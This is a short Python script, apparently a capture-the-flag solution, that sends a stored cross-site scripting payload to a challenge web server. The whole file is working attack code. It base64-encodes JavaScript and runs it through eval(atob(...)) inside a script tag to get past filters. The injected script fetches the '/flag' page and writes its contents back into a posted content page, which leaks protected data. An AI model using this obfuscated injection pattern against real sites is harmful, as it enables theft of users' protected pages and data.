import base64
import requests
content_url="http://0192d6fc41de7e048e7a39db597b5210.g66v.dg01.ciihw.cn:46620/con
tent/613cdda82446ae4b717db0853d7f6e16"

payload="fetch('/flag').then(res => {return res.text();}).then(res =>{return fetch('/content/613cdda82446ae4b717db0853d7f6e16',{method:'POST',headers: {'Content-Type': 'application/x-www-form-urlencoded'},body:'content=<br>binbin<br>'+res,}).then(res => {});});"

payload=base64.b64encode(payload.encode()).decode()

data={
'content':f"<script>window['eval'](atob('{payload}'));</script>"
}

res=requests.post(content_url,data=data)
print(res.text)